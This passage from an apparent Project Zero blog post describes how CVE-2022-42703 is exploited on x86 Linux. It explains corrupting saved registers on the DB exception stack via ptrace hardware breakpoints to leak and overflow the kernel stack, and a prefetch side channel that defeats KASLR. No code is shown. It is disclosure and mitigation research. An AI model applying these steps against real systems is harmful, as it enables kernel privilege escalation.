pushed directly onto this stack when the switch from userland to kernel mode occurs due to one of these exceptions. This also occurs when the kernel itself generates an Interrupt Stack Table exception and swaps to an exception stack - except in that case, kernel GPR’s are pushed instead. These pushed registers are later used to restore kernel state once the exception is handled. In the case of a userland triggered exception, register contents are restored from the task stack.&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;One example of an IST exception is a DB exception which can be triggered by an attacker via a hardware breakpoint, the associated registers of which are described &lt;/span&gt;&lt;a href=\"https://pdos.csail.mit.edu/6.828/2004/readings/i386/s12_02.htm\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;here&lt;/span&gt;&lt;/a&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;. Hardware breakpoints can be triggered by a variety of different memory access types, namely reads, writes, and instruction fetches. These hardware breakpoints can be set using &lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;ptrace(2)&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;, and are preserved during kernel mode execution in a task context such as during a syscall. That means that it’s possible for an attacker-set hardware breakpoint to be triggered in kernel mode, e.g. during a &lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;copy_to&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;/&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;from_user&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; call. The resulting exception will save and restore the kernel context via the aforementioned non-randomized exception stack, and that kernel context is an exceptionally good target for our arbitrary write primitive.&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Any of the registers that &lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;copy_to&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;/&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;from_user&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; is actively using at the time it handles the hardware breakpoint are corruptible by using our arbitrary-write primitive to overwrite their saved values on the exception stack. In this case, the size of the &lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;copy_user&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; call is the intuitive target. The size value is consistently stored in the &lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;rcx&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; register, which will be saved at the same virtual address every time the hardware breakpoint is hit. After corrupting this saved register with our arbitrary write primitive, the kernel will restore &lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;rcx&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; from the exception stack once it returns back to &lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;copy_to&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;/&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;from_user&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;. Since &lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;rcx&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; defines the number of bytes &lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;copy_user&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; should copy, this corruption will cause the kernel to illicitly copy too many bytes between userland and the kernel.&lt;/span&gt;&lt;/p&gt;&lt;h2 dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 16pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;\"&gt;…begets stack corruption&lt;/span&gt;&lt;/h2&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;The attack strategy starts as follows:&lt;/span&gt;&lt;/p&gt;&lt;ol style=\"margin-bottom: 0; margin-top: 0; padding-inline-start: 48px;\"&gt;&lt;li aria-level=\"1\" dir=\"ltr\" style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: decimal; vertical-align: baseline; white-space: pre;\"&gt;&lt;p dir=\"ltr\" role=\"presentation\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Fork a process Y from process X.&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li aria-level=\"1\" dir=\"ltr\" style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: decimal; vertical-align: baseline; white-space: pre;\"&gt;&lt;p dir=\"ltr\" role=\"presentation\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Process X ptraces process Y, then sets a hardware breakpoint at a known virtual address [addr] in process Y.&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li aria-level=\"1\" dir=\"ltr\" style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: decimal; vertical-align: baseline; white-space: pre;\"&gt;&lt;p dir=\"ltr\" role=\"presentation\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Process Y makes a large number of calls to uname(2), which calls &lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;copy_to_user&lt;/span&gt;&lt;span style=\"font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; from a kernel stack buffer to [addr]. This causes the kernel to constantly trigger the hardware watchpoint and enter the DB exception handler, using the DB exception stack to save and restore &lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;copy_to_user&lt;/span&gt;&lt;span style=\"font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; state&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li aria-level=\"1\" dir=\"ltr\" style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: decimal; vertical-align: baseline; white-space: pre;\"&gt;&lt;p dir=\"ltr\" role=\"presentation\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Simultaneously make many arbitrary writes at the known location of the DB exception stack’s saved &lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;rcx&lt;/span&gt;&lt;span style=\"font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; value, which is Process Y’s &lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;copy_to_user&lt;/span&gt;&lt;span style=\"font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;’s saved length.&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;div&gt;&lt;span style=\"font-family: Arial;\"&gt;&lt;span style=\"font-size: 14.6667px; white-space: pre-wrap;\"&gt;&lt;br /&gt;&lt;/span&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=\"separator\" style=\"clear: both; text-align: center;\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh8tz1hKWNhX-Wy3WfWRQpXpx20G62eGw7d8a_Kw7qQFfGyAgn6jsE9yxyFRR7hgrTW04cZDfp-V1BUnNqbFTXm9rFEktXTvf70fyPgAOk1pMgWZPzLBcRDND3bFObstL6cmPhp0J6nReczPiODwfsjecw_VsmRTp8cgodf-SEb1aQNkfQMQiPnHtt2/s1111/image3.png\" imageanchor=\"1\" style=\"margin-left: 1em; margin-right: 1em;\"&gt;&lt;img alt=\"DB Exception handling while the arbitrary write primitive writes to the CEA stack leads to corruption of the rcx register\" border=\"0\" data-original-height=\"1111\" data-original-width=\"881\" height=\"640\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh8tz1hKWNhX-Wy3WfWRQpXpx20G62eGw7d8a_Kw7qQFfGyAgn6jsE9yxyFRR7hgrTW04cZDfp-V1BUnNqbFTXm9rFEktXTvf70fyPgAOk1pMgWZPzLBcRDND3bFObstL6cmPhp0J6nReczPiODwfsjecw_VsmRTp8cgodf-SEb1aQNkfQMQiPnHtt2/w508-h640/image3.png\" width=\"508\" /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt; text-align: center;\"&gt;&lt;br /&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;The DB exception stack is used rarely, so it’s unlikely that we corrupt any unexpected kernel state via a spurious DB exception while spamming our arbitrary write primitive. The technique is also racy, but missing the race simply means corrupting stale stack-data. In that case, we simply try again. In my experience, it rarely takes more than a few seconds to win the race successfully.&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Upon successful corruption of the length value, the kernel will copy much of the current task’s stack back to userland, including the task-local stack cookie and return addresses. We can subsequently invert our technique and attack a &lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;copy_from_user&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; call instead. Instead of copying too many bytes from the kernel task stack to userland, we elicit the kernel to copy too many bytes from userland to the kernel task stack! Again we use a syscall, &lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;prctl(2)&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;, that performs a &lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;copy_from_user&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; call to a kernel stack buffer. Now by corrupting the length value, we generate a stack buffer overflow condition in this function where none previously existed. Since we’ve already leaked the stack cookie and the KASLR slide, it is trivially easy to bypass both mitigations and overwrite the return address.&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt; text-align: center;\"&gt;&lt;/p&gt;&lt;div class=\"separator\" style=\"clear: both; text-align: center;\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiYUmx3piEZB098RyCbjYgbTv18WhcOGwlD3J7HitFqympFWvbVS6iGvsBjdJLgZ5TFc6Y7I4QjugrzV78LCziyAkFMOUgvgDHP_OuPx32gSP5cvrqEV5G2eHqGFzsAHTspIaJ15Dql9ubkcGX6ZQ20NRe9J-cIsLM2y7FEg5CmIICJqoiakOzcYnqT/s555/image2.png\" imageanchor=\"1\" style=\"margin-left: 1em; margin-right: 1em;\"&gt;&lt;img alt=\"Image showing that we’ve gained control of the instruction pointer\" border=\"0\" data-original-height=\"365\" data-original-width=\"555\" height=\"420\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiYUmx3piEZB098RyCbjYgbTv18WhcOGwlD3J7HitFqympFWvbVS6iGvsBjdJLgZ5TFc6Y7I4QjugrzV78LCziyAkFMOUgvgDHP_OuPx32gSP5cvrqEV5G2eHqGFzsAHTspIaJ15Dql9ubkcGX6ZQ20NRe9J-cIsLM2y7FEg5CmIICJqoiakOzcYnqT/w640-h420/image2.png\" width=\"640\" /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;br /&gt;&lt;/span&gt;&lt;p&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; white-space: pre-wrap;\"&gt;Completing a ROP chain for the kernel is left as an exercise to the reader.&lt;/span&gt;&lt;/p&gt;&lt;h2 dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 16pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;\"&gt;Fetching the KASLR slide with prefetch&lt;/span&gt;&lt;/h2&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Upon reporting this bug to the Linux kernel security team, our suggestion was to start randomizing the location of the percpu &lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;cpu_entry_area&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; (CEA), and consequently the associated exception and syscall entry stacks. This is an effective mitigation against remote attackers but is insufficient to prevent a local attacker from taking advantage. 6 years ago, Daniel Gruss et al. &lt;/span&gt;&lt;a href=\"https://gruss.cc/files/prefetch.pdf\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;discovered a new more reliable technique for exploiting the TLB timing side channel in x86 CPU’s&lt;/span&gt;&lt;/a&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;. Their results demonstrated that prefetch instructions executed in user mode retired at statistically significant different latencies depending on whether the requested virtual address to be prefetched was mapped vs unmapped, even if that virtual address was only mapped in kernel mode. &lt;/span&gt;&lt;a href=\"https://docs.kernel.org/x86/pti.html\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;kPTI&lt;/span&gt;&lt;/a&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; was helpful in mitigating this side channel, however, most modern CPUs now have innate protection for Meltdown, which kPTI was specifically designed to address, and thusly kPTI (which has significant performance implications) is disabled on modern microarchitectures. That decision means it is once again possible to take advantage of the prefetch side channel to defeat not only KASLR, but also the CPU entry area randomization mitigation, preserving the viability of the CEA stack corruption exploit technique against modern X86 CPUs.&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;There are surprisingly few fast and reliable examples of this prefetch KASLR bypass technique available in the open source realm, so I made the decision to write one.&lt;/span&gt;&lt;/p&gt;&lt;h2 dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 16pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;\"&gt;Implementation&lt;/span&gt;&lt;/h2&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;The meat of implementing this technique effectively is in serially reading the processor’s time stamp counter before and after performing a prefetch. &lt;/span&gt;&lt;a href=\"https://github.com/IAIK/prefetch\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;Daniel Gruss helpfully provided highly effective and open source code for doing just that.&lt;/span&gt;&lt;/a&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; The only edit I made (as suggested by Jann Horn) was to swap to using &lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;lfence&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; instead of &lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;cpuid&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; as the serializing instruction, as &lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;cpuid&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; is emulated in VM environments. It also became apparent in practice that there was no need to perform any cache-flushing routines in order to witness the side-channel effect. It is simply enough to time every prefetch attempt.&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Generating prefetch timings for all 512 possible KASLR slots yields quite a bit of fuzzy data in need of analyzing. To minimize noise, multiple samples of each tested address are taken, and the minimum value from that set of samples is used in the results as the representative value for an address. On the Tiger Lake CPU this test was primarily performed on, no more than 16 samples per slot were needed to generate exceptionally reliable results. Low-resolution minimum prefetch time slot identification narrows down the area to search in while avoiding false positives for the higher resolution edge-detection code which finds the precise address at which prefetch dramatically drops in run-time. The result of this effort is a PoC which can correctly identify the KASLR slide on my local machine with 99.999% accuracy (95% accuracy in a VM) while running faster than it takes to grep through kallsyms for the kernel base address:&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt; text-align: center;\"&gt;&lt;/p&gt;&lt;div class=\"separator\" style=\"clear: both; text-align: center;\"&gt;&lt;a href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgE360QpgSL2MstPC7ytC_a22fGUz2uwugoUW0sKHq66aCHk7loOvFCrxAs0ePlNIzvdutTS4wmV5Ilfz2u8MLuQd-n5Z_fSHMcfQdIj-8ooyABpDomHKbxQuCLT3REttBscYj9_F4eGBfKniEm99z4p-ta10N6cXy6nIoGLBV1y8aNn_DiqHBuzVTO/s891/image1.png\" imageanchor=\"1\" style=\"margin-left: 1em; margin-right: 1em;\"&gt;&lt;img alt=\"Breaking KASLR with Prefecth: Grepping through kallsyms took .077 seconds while using the prefetch technique took .013 seconds\" border=\"0\" data-original-height=\"306\" data-original-width=\"891\" height=\"220\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgE360QpgSL2MstPC7ytC_a22fGUz2uwugoUW0sKHq66aCHk7loOvFCrxAs0ePlNIzvdutTS4wmV5Ilfz2u8MLuQd-n5Z_fSHMcfQdIj-8ooyABpDomHKbxQuCLT3REttBscYj9_F4eGBfKniEm99z4p-ta10N6cXy6nIoGLBV1y8aNn_DiqHBuzVTO/w640-h220/image1.png\" width=\"640\" /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;br /&gt;&lt;/span&gt;&lt;p&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;This prefetch code does indeed work to find the locations of the randomized CEA regions in Peter Ziljstra’s proposed patch. However, the journey to that point results in code that demonstrates another deeply significant issue - KASLR is comprehensively compromised on x86 against local attackers, and has been for the past several years, and will be for the indefinite future. There are presently no plans in place to resolve the myriad microarchitectural issues that lead to side channels like this one. Future work is needed in this area in order to preserve the integrity of KASLR, or alternatively, it is probably time to accept that KASLR is no longer an effective mitigation against local attackers and to develop defensive code and mitigations that accept its limitations.&lt;/span&gt;&lt;/p&gt;&lt;h2 dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 16pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;\"&gt;Conclusion&lt;/span&gt;&lt;/h2&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;This exploit demonstrates a highly reliable and agnostic technique that can allow a broad spectrum of uncontrolled arbitrary write primitives to achieve kernel code execution on x86 platforms. While it is possible to mitigate this exploit technique from a remote context, an attacker in a local context can utilize known microarchitectural side-channels to defeat the current mitigations. Additional work in this area might be valuable to continue to make exploitation more difficult, such as performing in-stack randomization so that the stack offset of the saved state changes on every taken IST exception. For now however, this remains a viable and powerful exploit strategy on x86 Linux.&lt;/span&gt;&lt;/p&gt;&lt;div&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;&lt;/span&gt;"},"link":[{"@rel":"replies","@type":"application/atom+xml","@href":"https://googleprojectzero.blogspot.com/feeds/2515628030502752973/comments/default","@title":"Post Comments"},{"@rel":"replies","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2022/12/exploiting-CVE-2022-42703-bringing-back-the-stack-attack.html#comment-form","@title":"0 